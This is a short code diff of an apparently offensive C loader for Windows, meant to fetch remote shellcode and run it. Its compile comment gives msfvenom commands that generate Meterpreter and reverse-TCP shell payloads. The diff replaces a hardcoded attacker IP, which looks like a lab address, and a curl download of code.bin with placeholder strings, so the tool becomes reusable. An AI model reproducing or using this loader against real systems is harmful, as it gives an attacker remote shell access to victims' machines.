@@ -1,6 +1,7 @@
 /* TO COMPILE:
 x86_64-w64-mingw32-gcc -o shell.exe shell.c -lws2_32
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.90 LPORT=9002 -f raw -o www/code.bin
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=REPLACE_THIS_IP LPORT=REPLACE_THIS_PORT -f raw -o www/code.bin
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=REPLACE_THIS_IP LPORT=REPLACE_THIS_PORT -f raw -o www/code.bin
 */
 #include <stdio.h>
 #include <stdlib.h>
@@ -9,7 +10,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.90 LPORT=9002 -f 
 int main()
 {
     FILE *fpipe;
-    char *command = "curl http://10.10.14.90/code.bin";
+    char *command = "REPLACE_THIS_COMMAND";
     char c = 0;
     unsigned char code[510];
     int counter = 0;
